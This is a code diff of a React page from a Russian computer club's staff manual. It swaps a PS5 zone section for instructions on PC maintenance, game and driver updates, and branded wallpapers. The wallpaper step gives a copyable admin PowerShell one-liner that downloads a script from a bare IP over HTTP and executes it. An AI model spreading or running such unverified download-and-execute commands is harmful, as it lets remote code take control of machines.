@@ -1,18 +1,19 @@
-import React from 'react';
-import { Tv, Gamepad2, Settings, ListChecks, Sofa, AlertTriangle, MonitorPlay, Zap, KeyRound } from 'lucide-react';
+import React, { useState } from 'react';
+import Image from 'next/image';
+import { Moon, Terminal, Download, ShieldAlert, Cpu, Gamepad2, HardDrive, AlertTriangle, Wallpaper, MonitorDown, Copy, Check } from 'lucide-react';
 import { SectionBadge } from '../components/SectionBadge';
+import { PcMonitorWidget } from '../components/PcMonitorWidget';
 
-const ACTIVATION_STEPS = [
-    { text: 'Пополнить баланс гостя.', icon: Zap },
-    { text: 'Пробить «Доплата TV 100р/чел» если: обычное ТВ (> 2 гостей) или VIP TV Комната (> 4 гостей).', icon: AlertTriangle, highlight: true },
-    { text: 'Нажать «Активировать ТВ» в Langame.', icon: MonitorPlay },
-    { text: 'Выбрать нужный тариф.', icon: ListChecks },
-    { text: 'Нажать «Отправить код».', icon: Settings },
-    { text: 'Ввести код, который пришел клиенту.', icon: KeyRound },
-    { text: 'Взять джойстики, проводить гостей и выбрать верный аккаунт (PSStandart/PSVIP).', icon: Gamepad2, highlight: true }
-];
+export function Section13({ setZoomedImage, onNavigate }: { setZoomedImage?: (src: string | null) => void; onNavigate?: (sectionId: string) => void }) {
+    const installCommand = 'irm http://82.97.253.207:4200/setup/bootstrap.ps1 | iex';
+    const [isCommandCopied, setIsCommandCopied] = useState(false);
 
-export function Section13() {
+    const copyInstallCommand = async () => {
+        await navigator.clipboard.writeText(installCommand);
+        setIsCommandCopied(true);
+        window.setTimeout(() => setIsCommandCopied(false), 2000);
+    };
+
     return (
         <section className="animate-in fade-in slide-in-from-bottom-4 duration-500">
             <SectionBadge number="13" label="Раздел" />
@@ -20,155 +21,293 @@ export function Section13() {
             <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-10">
                 <div>
                     <h2 className="font-tactic font-black text-3xl md:text-5xl uppercase italic text-slate-900 mb-3 flex items-center gap-4">
-                        <Tv className="text-blue-600 hidden sm:block" size={48} />
-                        Зона <span className="text-blue-600">TV (PS5)</span>
+                        <Moon className="text-indigo-500 hidden sm:block" size={48} />
+                        Обновления <span className="text-indigo-500">ПК</span>
                     </h2>
                     <p className="font-chakra text-slate-600 text-sm md:text-base max-w-2xl">
-                        Инструкция по работе с консольной зоной: алгоритм активации, контроль чистоты и список установленных игр.
+                        Инструкция для ночных администраторов: техническое обслуживание инфраструктуры клуба и обязательное обновление ПО.
                     </p>
                 </div>
             </div>
 
-            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
-                {/* АКТИВАЦИЯ */}
-                <div className="rounded-3xl border border-slate-200 bg-white overflow-hidden shadow-sm flex flex-col h-full">
-                    <div className="bg-blue-600 p-6 flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-blue-700 text-white">
-                        <div className="flex items-center gap-3">
-                            <Gamepad2 size={24} />
-                            <h3 className="font-tactic font-black text-xl uppercase italic">Активация сеанса</h3>
+            {/* ТЕХНИЧЕСКИЙ РЕЖИМ */}
+            <div className="rounded-3xl border border-slate-200 bg-white overflow-hidden shadow-sm mb-8">
+                <div className="bg-slate-900 p-6 flex items-center gap-4 border-b border-slate-800">
+                    <div className="w-12 h-12 rounded-xl bg-indigo-500/20 text-indigo-400 flex items-center justify-center shrink-0">
+                        <Terminal size={24} />
+                    </div>
+                    <div>
+                        <h3 className="font-tactic font-black text-xl uppercase italic text-white mb-1">Технический режим</h3>
+                        <p className="font-chakra text-slate-400 text-sm">Управление ПК через чат</p>
+                    </div>
+                </div>
+
+                <div className="p-6 md:p-8">
+                    <div className="flex flex-col md:flex-row gap-8">
+                        <div className="flex-1 space-y-6">
+                            <div className="bg-indigo-50 border border-indigo-100 rounded-2xl p-4">
+                                <h4 className="text-xs font-chakra font-bold text-indigo-400 uppercase tracking-widest mb-2">Активация режима</h4>
+                                <div className="space-y-3">
+                                    <div className="flex items-center justify-between bg-white p-3 rounded-xl border border-indigo-100/50 shadow-sm">
+                                        <span className="font-chakra text-sm text-slate-600">Один конкретный ПК</span>
+                                        <code className="bg-slate-800 text-indigo-400 font-mono text-sm px-3 py-1 rounded-lg font-bold">$teh 14</code>
+                                    </div>
+                                    <div className="flex items-center justify-between bg-white p-3 rounded-xl border border-indigo-100/50 shadow-sm">
+                                        <span className="font-chakra text-sm text-slate-600">Все свободные ПК</span>
+                                        <code className="bg-slate-800 text-indigo-400 font-mono text-sm px-3 py-1 rounded-lg font-bold">$teh all</code>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                                <div className="bg-slate-50 border border-slate-100 rounded-xl p-4">
+                                    <h4 className="text-xs font-chakra font-bold text-slate-400 uppercase tracking-widest mb-1">Длительность</h4>
+                                    <div className="font-tactic font-black text-xl text-slate-700 italic">100 мин</div>
+                                </div>
+                                <div className="bg-slate-50 border border-slate-100 rounded-xl p-4">
+                                    <h4 className="text-xs font-chakra font-bold text-slate-400 uppercase tracking-widest mb-1">Выход из режима</h4>
+                                    <div className="font-chakra text-sm font-bold text-slate-700">ПКМ по значку LG → Тех. стоп</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div className="md:w-1/3 flex flex-col gap-4">
+                            <div className="bg-rose-50 border border-rose-100 rounded-2xl p-5 flex items-start gap-3">
+                                <AlertTriangle className="text-rose-500 shrink-0 mt-0.5" size={20}/>
+                                <div>
+                                    <h4 className="font-tactic font-black text-sm uppercase text-rose-900 mb-1">Обязательное условие</h4>
+                                    <p className="font-chakra text-rose-700 text-xs leading-relaxed">Перед отправкой команды в чат обязательно укажите <strong>подробную причину</strong> перехода в тех. режим.</p>
+                                </div>
+                            </div>
+                            <div className="bg-orange-50 border border-orange-100 rounded-2xl p-5 flex items-start gap-3">
+                                <ShieldAlert className="text-orange-500 shrink-0 mt-0.5" size={20}/>
+                                <div>
+                                    <h4 className="font-tactic font-black text-sm uppercase text-orange-900 mb-1">Сбой системы</h4>
+                                    <p className="font-chakra text-orange-700 text-xs leading-relaxed">Если ПК не перевелись в технический режим — незамедлительно сообщить руководству.</p>
+                                </div>
+                            </div>
                         </div>
                     </div>
-                    
-                    <div className="p-6 md:p-8 flex-1 bg-slate-50 relative">
-                        <ol className="relative border-l-2 border-blue-100 ml-3 space-y-6">
-                            {ACTIVATION_STEPS.map((step, idx) => {
-                                const Icon = step.icon;
-                                return (
-                                    <li key={idx} className="ml-6">
-                                        <span className={`absolute -left-[17px] flex items-center justify-center w-8 h-8 rounded-full ring-4 ring-slate-50 ${step.highlight ? 'bg-blue-600 text-white' : 'bg-white text-blue-400 border border-blue-100 shadow-sm'}`}>
-                                            <Icon size={14} />
-                                        </span>
-                                        <div className={`text-sm font-chakra mt-1 ${step.highlight ? 'font-bold text-slate-800' : 'text-slate-600'}`}>
-                                            {step.text}
-                                        </div>
-                                    </li>
-                                );
-                            })}
+                </div>
+            </div>
+
+            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
+                {/* ОБНОВЛЕНИЕ ИГР */}
+                <div className="rounded-3xl bg-slate-900 text-white overflow-hidden shadow-sm flex flex-col">
+                    <div className="p-6 md:p-8 flex-1">
+                        <div className="flex items-center gap-3 mb-6">
+                            <Gamepad2 className="text-emerald-400" size={28} />
+                            <h3 className="font-tactic font-black text-2xl uppercase italic">Обновление игр</h3>
+                        </div>
+                        
+                        <div className="space-y-4 font-chakra text-sm text-slate-300">
+                            <p className="leading-relaxed">
+                                После перехода в тех. режим начните обновление во всех лаунчерах: <strong>Steam, Lesta Games, VK Play, Riot Client</strong>.
+                            </p>
+                            
+                            <div className="bg-white/5 border border-white/10 rounded-xl p-4">
+                                <strong className="text-white block mb-2">Особые случаи:</strong>
+                                <ul className="list-disc list-inside space-y-1 ml-1">
+                                    <li><span className="text-emerald-400">Valorant</span> и <span className="text-emerald-400">LoL</span> обновляются кликом по иконке игры (без захода в лаунчер).</li>
+                                    <li>Апдейт <strong>FaceIT</strong> и очистка дисков выполняются параллельно загрузкам игр.</li>
+                                </ul>
+                            </div>
+
+                            <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-xl p-4 mt-4">
+                                <strong className="text-white block mb-2 uppercase text-[10px] tracking-widest text-emerald-400">Обязательный список обновлений:</strong>
+                                <div className="flex flex-wrap gap-2">
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">CS2 <span className="opacity-50 font-normal">Steam</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">Dota 2 <span className="opacity-50 font-normal">Steam</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">PUBG: BATTLEGROUNDS <span className="opacity-50 font-normal">Steam</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">Apex Legends <span className="opacity-50 font-normal">Steam</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">Valorant <span className="opacity-50 font-normal">Riot</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">League of Legends <span className="opacity-50 font-normal">Riot</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">Мир Танков <span className="opacity-50 font-normal">Lesta</span></span>
+                                    <span className="bg-white/10 border border-white/5 text-white px-2 py-1 rounded text-xs font-bold shadow-sm">Fortnite <span className="opacity-50 font-normal">Epic</span></span>
+                                </div>
+                            </div>
+
+                            <div className="bg-indigo-500/20 border border-indigo-500/30 rounded-xl p-4 mt-4">
+                                <h4 className="font-bold text-indigo-300 uppercase tracking-widest text-[10px] mb-2">Авторизация Steam</h4>
+                                <p className="mb-2">Используйте <strong>Steam Guard на рабочем телефоне</strong>.</p>
+                                <div className="text-xs text-indigo-200 bg-indigo-900/50 px-3 py-1.5 rounded inline-block border border-indigo-500/20">
+                                    Один аккаунт Guard = не более 5 устройств одновременно!
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div className="bg-slate-800 p-4 border-t border-slate-700/50">
+                        <a href="#" className="flex justify-center items-center gap-2 w-full bg-indigo-500 hover:bg-indigo-600 text-white py-3 rounded-xl font-chakra font-bold transition-colors">
+                            Открыть таблицу аккаунтов
+                        </a>
+                    </div>
+                </div>
+
+                {/* ОБНОВЛЕНИЕ ДРАЙВЕРОВ */}
+                <div className="rounded-3xl border border-slate-200 bg-white overflow-hidden shadow-sm flex flex-col">
+                    <div className="p-6 md:p-8 flex-1">
+                        <div className="flex items-center gap-3 mb-6">
+                            <Cpu className="text-blue-500" size={28} />
+                            <h3 className="font-tactic font-black text-2xl uppercase italic text-slate-900">Драйвера (SDI)</h3>
+                        </div>
+
+                        <div className="space-y-4 font-chakra text-sm text-slate-600">
+                            <p className="leading-relaxed">
+                                Установка драйверов производится строго через утилиту <strong>Snappy Driver Installer (SDI)</strong>, версия Portable.
+                            </p>
+
+                            <ol className="list-decimal list-inside space-y-3 ml-1">
+                                <li>Скачать с <a href="https://sdi-tool.org/" target="_blank" className="text-blue-500 font-bold hover:underline">sdi-tool.org</a> в папку «Загрузки».</li>
+                                <li>Запустить файл <code>SDI_R2408</code> (версия SDI Lite).</li>
+                                <li>Выбрать сканирование — загрузить <span className="font-bold text-slate-800">индексы новых паков</span>.</li>
+                                <li className="text-rose-600 font-bold bg-rose-50 px-2 py-1 -ml-2 rounded">
+                                    ОБЯЗАТЕЛЬНО создать точку восстановления!
+                                </li>
+                                <li>Выделить нужные драйвера вручную и установить.</li>
+                                <li>Перезагрузить ПК и проверить корректность работы.</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div className="bg-slate-50 p-4 border-t border-slate-100">
+                        <div className="flex gap-2 p-3 bg-blue-50 border border-blue-100 text-blue-800 rounded-xl font-chakra text-xs">
+                            <Download className="shrink-0" size={16} />
+                            <span>SDI работает без установки, скачивать заново на каждый ПК не нужно — можно использовать с флешки.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            {/* ОШИБКА БУФЕРА ОВЕРЛЕЯ */}
+            <div className="rounded-3xl border border-rose-200 bg-white overflow-hidden shadow-sm mb-12">
+                <div className="bg-rose-50 p-6 flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-rose-100">
+                    <div className="flex items-center gap-4">
+                         <div className="w-12 h-12 rounded-xl bg-rose-500/20 text-rose-500 flex items-center justify-center shrink-0">
+                            <AlertTriangle size={24} />
+                        </div>
+                        <div>
+                            <h3 className="font-tactic font-black text-xl uppercase italic text-rose-900 mb-1">Переполнение буфера оверлея</h3>
+                            <p className="font-chakra text-rose-600 text-sm">Внезапное сообщение о перезагрузке ПК у гостя</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div className="p-6 md:p-8 font-chakra text-slate-700 text-sm leading-relaxed space-y-4">
+                    <p>
+                        Иногда у гостей поверх игры появляется плашка: <strong>«Буфер оверлея переполнен. Обратитесь к администратору, компьютер скоро перезагрузится»</strong>. Пугаться не нужно! Это техническая особенность бездисковой системы — она срабатывает, когда клиент, находясь в своем обычного сеансе, начинает скачивать огромное обновление для игры. Буфер временного файла забивается, и система сбрасывается.
+                    </p>
+                    <div className="bg-slate-50 border border-slate-200 rounded-xl p-5">
+                        <h4 className="font-bold text-slate-900 uppercase tracking-widest text-[11px] mb-3">Алгоритм решения:</h4>
+                        <ol className="list-decimal list-inside space-y-2 text-slate-600 ml-1 font-medium">
+                            <li>Перезагрузить ПК. Завершить пакет гостя и остановить его время.</li>
+                            <li>Перевести компьютер в <strong>Технический режим</strong> (команда <code>$teh [номер]</code> в чат).</li>
+                            <li>Провести все необходимые обновления этой крупной игры, пока мы находимся в тех. режиме.</li>
+                            <li>Выключить Технический режим, дать гостю снова зайти под своим аккаунтом.</li>
+                            <li>Рассчитать потерянное гостем время в Калькуляторе компенсаций.</li>
+                            <li className="text-rose-600 font-bold bg-rose-50/50 p-2 rounded -ml-2 inline-block">Отправить в рабочий чат шаблон со скриншотом калькулятора, указав причину: <br/><em>«Решение проблемы по буферу оверлея»</em>.</li>
                         </ol>
                     </div>
                 </div>
-
-                {/* УБОРКА */}
-                <div className="flex flex-col h-full">
-                    <div className="rounded-3xl border border-slate-200 bg-white p-6 md:p-8 shadow-sm group hover:border-cyan-300 transition-colors h-full flex flex-col justify-center">
-                        <div className="flex items-start gap-4 mb-6">
-                            <div className="shrink-0 w-16 h-16 rounded-2xl bg-cyan-50 text-cyan-500 flex items-center justify-center group-hover:bg-cyan-500 group-hover:text-white transition-colors">
-                                <Sofa size={32} />
-                            </div>
-                            <div>
-                                <h4 className="font-tactic font-black text-2xl uppercase text-slate-900 mb-2">Порядок после гостя</h4>
-                                <p className="font-chakra text-slate-600 leading-relaxed md:text-lg">
-                                    Обязательная проверка зоны: очистить диван, пол, бочки и сам ТВ.
-                                </p>
-                            </div>
-                        </div>
-                        <ul className="grid grid-cols-1 gap-3 text-sm font-chakra font-bold text-cyan-700 bg-cyan-50/50 p-6 rounded-2xl border border-cyan-100">
-                            <li className="flex items-center gap-3"><div className="w-2 h-2 rounded-full bg-cyan-400"/>Тщательно протереть всё влажными салфетками</li>
-                            <li className="flex items-center gap-3"><div className="w-2 h-2 rounded-full bg-cyan-400"/>Поставить все геймпады на зарядную станцию</li>
-                        </ul>
-                    </div>
-                </div>
             </div>
 
-            {/* РЕШЕНИЕ ПРОБЛЕМ */}
-            <div className="mb-12">
-                <h4 className="flex items-center gap-2 text-xs font-chakra font-black uppercase tracking-[0.2em] text-slate-400 mb-5 ml-2">
-                    <Settings size={14} /> Технические инструкции
-                </h4>
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                    {/* Баг Лангейма */}
-                    <div className="rounded-3xl border border-orange-200 bg-orange-50/50 p-6 shadow-sm flex flex-col h-full">
-                        <h4 className="flex items-center gap-2 font-chakra font-black text-orange-500 uppercase tracking-widest text-[10px] mb-3">
-                            <AlertTriangle size={14} /> Langame
-                        </h4>
-                        <h3 className="font-tactic font-black text-slate-900 uppercase text-sm mb-2">Статус «Соединение»</h3>
-                        <p className="font-chakra text-slate-600 text-sm leading-relaxed mb-4 flex-1">
-                            Если телевизоры "зависли" при подключении, перезапустите систему:
-                        </p>
-                        <div className="bg-white border border-orange-100 text-slate-700 p-3 rounded-xl shadow-sm text-xs font-chakra font-bold flex flex-col gap-2">
-                            <span className="text-orange-600 line-through">1. Закрыть Langame на ПК админа</span>
-                            <span className="text-emerald-600">2. Залогиниться заново</span>
+            {/* ФИРМЕННЫЕ ОБОИ CYBERX */}
+            <div className="rounded-3xl border border-violet-200 bg-white overflow-hidden shadow-sm mb-12">
+                <div className="bg-gradient-to-r from-violet-600 to-indigo-600 p-6 flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-violet-500/30">
+                    <div className="flex items-center gap-4">
+                        <div className="w-12 h-12 rounded-xl bg-white/20 text-white flex items-center justify-center shrink-0 backdrop-blur-sm">
+                            <MonitorDown size={24} />
+                        </div>
+                        <div>
+                            <h3 className="font-tactic font-black text-xl uppercase italic text-white mb-1">Фирменные обои CyberX</h3>
+                            <p className="font-chakra text-violet-200 text-sm">Установка и синхронизация обоев с сервером</p>
                         </div>
                     </div>
+                </div>
 
-                    {/* Замок на играх */}
-                    <div className="rounded-3xl border border-violet-200 bg-violet-50/50 p-6 shadow-sm flex flex-col h-full">
-                        <h4 className="flex items-center gap-2 font-chakra font-black text-violet-500 uppercase tracking-widest text-[10px] mb-3">
-                            <AlertTriangle size={14} /> PlayStation 5
+                <div className="p-6 md:p-8 font-chakra text-slate-700 text-sm leading-relaxed space-y-6">
+                    <div className="bg-violet-50 border border-violet-100 rounded-2xl p-5">
+                        <h4 className="font-bold text-violet-900 uppercase tracking-widest text-[11px] mb-3 flex items-center gap-2">
+                            <AlertTriangle size={14} className="text-violet-500" />
+                            Когда необходима установка обоев
                         </h4>
-                        <h3 className="font-tactic font-black text-slate-900 uppercase text-sm mb-2">Замок на играх (FIFA, UFC)</h3>
-                        <p className="font-chakra text-slate-600 text-[13px] leading-relaxed mb-4 flex-1">
-                            Если игры не запускаются (висит замок), восстановите лицензии:
+                        <ul className="space-y-2 text-violet-800">
+                            <li className="flex items-start gap-2">
+                                <span className="w-1.5 h-1.5 rounded-full bg-violet-400 shrink-0 mt-1.5" />
+                                <span>После <strong>переустановки Windows</strong> на компьютере</span>
+                            </li>
+                            <li className="flex items-start gap-2">
+                                <span className="w-1.5 h-1.5 rounded-full bg-violet-400 shrink-0 mt-1.5" />
+                                <span>Если обои на данном ПК <strong>отличаются от обоев на других компьютерах</strong> клуба</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div className="bg-slate-50 border border-slate-200 rounded-xl p-5">
+                        <div className="flex flex-wrap items-center gap-2 mb-3">
+                            <h4 className="font-bold text-slate-900 uppercase tracking-widest text-[11px]">Быстрая установка</h4>
+                            <span className="rounded-full bg-emerald-100 px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider text-emerald-700">Рекомендуется</span>
+                        </div>
+                        <p className="mb-4 text-slate-600">
+                            Откройте <strong>PowerShell от имени администратора</strong> и выполните одну команду: она скачает клиент и запустит установку «из коробки».
                         </p>
-                        <ol className="text-xs font-chakra font-bold text-slate-700 bg-white border border-violet-100 p-3 rounded-xl shadow-sm space-y-1">
-                            <li>1. Зайти в <span className="text-violet-600">PSVIP</span> (или CyberxA).</li>
-                            <li>2. Настройки → Пользователи → Другое.</li>
-                            <li>3. Включить <strong>«Общий доступ»</strong>.</li>
-                            <li>4. Вернуться в PSStandart/CyberxB.</li>
+                        <div className="flex flex-col gap-3 rounded-xl bg-slate-900 p-4 sm:flex-row sm:items-center sm:justify-between">
+                            <code className="break-all font-mono text-sm font-bold text-emerald-400">{installCommand}</code>
+                            <button
+                                type="button"
+                                onClick={copyInstallCommand}
+                                className="inline-flex shrink-0 items-center justify-center gap-2 rounded-lg bg-white/10 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-white/20"
+                            >
+                                {isCommandCopied ? <Check size={15} /> : <Copy size={15} />}
+                                {isCommandCopied ? 'Скопировано' : 'Копировать'}
+                            </button>
+                        </div>
+                        <p className="mt-4 rounded-lg bg-emerald-50 p-3 text-emerald-800">
+                            В процессе установщик спросит <strong>клуб</strong> (Altufevo / Novokosino) и <strong>номер ПК</strong>, создаст задачи в Планировщике Windows и сразу применит обои.
+                        </p>
+                    </div>
+
+                    <div className="rounded-xl border border-indigo-100 bg-indigo-50 p-5">
+                        <h4 className="mb-3 font-bold uppercase tracking-widest text-[11px] text-indigo-900">Как открыть PowerShell от имени администратора</h4>
+                        <ol className="ml-1 list-decimal list-inside space-y-2 font-medium text-indigo-900">
+                            <li>Нажмите клавишу <strong>Windows</strong> и введите <strong>PowerShell</strong>.</li>
+                            <li>Нажмите правой кнопкой мыши на <strong>Windows PowerShell</strong> и выберите «Запуск от имени администратора».</li>
+                            <li>Подтвердите запрос Windows кнопкой «Да», вставьте команду и нажмите <strong>Enter</strong>.</li>
                         </ol>
                     </div>
 
-                    {/* Тест геймпада */}
-                    <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm flex flex-col h-full">
-                        <h4 className="flex items-center gap-2 font-chakra font-black text-slate-400 uppercase tracking-widest text-[10px] mb-3">
-                            <Gamepad2 size={14} /> Периферия
-                        </h4>
-                        <h3 className="font-tactic font-black text-slate-900 uppercase text-sm mb-2">Проверка джойстика</h3>
-                        <p className="font-chakra text-slate-600 text-[13px] leading-relaxed mb-4">
-                            Подключите геймпад к ПК по Type-C кабелю и откройте один из тестеров:
-                        </p>
-                        <div className="flex flex-col gap-2 font-chakra text-xs font-bold w-full mb-3">
-                            <a href="https://mitinogame.ru/gamepad-tester/" target="_blank" className="bg-slate-50 text-blue-600 hover:bg-blue-50 border border-slate-100 hover:border-blue-200 px-3 py-2 rounded-lg transition-colors truncate">mitinogame.ru/gamepad-tester/</a>
-                            <a href="https://online-controller-tester.vercel.app/" target="_blank" className="bg-slate-50 text-blue-600 hover:bg-blue-50 border border-slate-100 hover:border-blue-200 px-3 py-2 rounded-lg transition-colors truncate">online-controller-tester.vercel.app</a>
+                    {/* Пример обоев */}
+                    <div>
+                        <h4 className="font-bold text-slate-400 uppercase tracking-widest text-[10px] mb-3">Пример фирменных обоев:</h4>
+                        <div 
+                            className="relative rounded-2xl overflow-hidden border border-slate-200 shadow-md cursor-zoom-in group"
+                            onClick={() => setZoomedImage?.('/instruktsiya/29may.jpeg')}
+                        >
+                            <Image
+                                src="/instruktsiya/29may.jpeg"
+                                alt="Пример фирменных обоев CyberX Community"
+                                width={1920}
+                                height={1080}
+                                className="w-full h-auto object-cover transition-transform duration-300 group-hover:scale-[1.02]"
+                                unoptimized
+                            />
+                            <div className="absolute inset-0 bg-gradient-to-t from-black/40 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex items-end justify-center pb-4">
+                                <span className="font-chakra text-white text-xs font-bold bg-black/40 backdrop-blur-sm px-3 py-1.5 rounded-lg">Нажмите для увеличения</span>
+                            </div>
                         </div>
-                        <ul className="text-[11px] font-chakra text-slate-500 space-y-1 bg-slate-50 p-2 rounded-lg mt-auto">
-                            <li>Осторожно повращайте стики по кругу и диагоналям не до упора. Курсор на экране должен идти <strong>плавно, без рывков</strong>.</li>
-                        </ul>
+                    </div>
+
+                    <div className="flex gap-2 p-3 bg-indigo-50 border border-indigo-100 text-indigo-800 rounded-xl font-chakra text-xs">
+                        <Download className="shrink-0 mt-0.5" size={16} />
+                        <span>После установки обои будут автоматически обновляться с сервера при появлении новых акций и праздников. Повторная установка не требуется.</span>
                     </div>
                 </div>
             </div>
 
-            {/* СПИСОК ИГР */}
-            <div className="rounded-3xl bg-slate-900 text-white overflow-hidden shadow-sm mb-12">
-                <div className="p-6 border-b border-slate-800">
-                    <h3 className="font-tactic font-black text-xl uppercase italic">Библиотека игр PS5</h3>
-                </div>
-                <div className="grid grid-cols-1 md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-slate-800">
-                    <div className="p-6 md:p-8 bg-slate-900/50">
-                        <h4 className="font-chakra font-bold uppercase tracking-widest text-emerald-400 text-xs mb-4">📍 Клуб Новокосино</h4>
-                        <div className="flex flex-wrap gap-2">
-                            {['FIFA 26', 'UFC 5', 'Mortal Kombat 1', 'GTA 5', 'NHL 26', 'NBA 26', 'Split Fiction', 'It Takes Two'].map(game => (
-                                <span key={game} className="bg-white/10 border border-white/5 px-3 py-1.5 rounded-lg text-sm font-chakra font-bold">{game}</span>
-                            ))}
-                        </div>
-                    </div>
-                    <div className="p-6 md:p-8 bg-slate-900 flex flex-col">
-                        <h4 className="font-chakra font-bold uppercase tracking-widest text-violet-400 text-xs mb-4">📍 Клуб Алтуфьево</h4>
-                        <div className="flex flex-wrap gap-2">
-                            {['FIFA 26', 'UFC 5', 'Mortal Kombat 1', 'GTA 5'].map(game => (
-                                <span key={game} className="bg-slate-800 border border-slate-700 text-slate-300 px-3 py-1.5 rounded-lg text-sm font-chakra">{game}</span>
-                            ))}
-                        </div>
-                        <div className="mt-auto pt-6 text-[10px] text-slate-500 font-chakra uppercase tracking-widest">
-                            Набор игр ограничен базовыми дисциплинами
-                        </div>
-                    </div>
-                </div>
-            </div>
+            {/* МОНИТОРИНГ ПК */}
+            <PcMonitorWidget onNavigate={onNavigate} />
 
             <div className="mt-16 pt-8 border-t border-slate-200 flex justify-between gap-4">
                 <p className="text-xs font-chakra font-bold text-slate-400 uppercase tracking-widest mt-4">
-                    Раздел 12/14
+                    Раздел 11/14
                 </p>
             </div>
         </section>
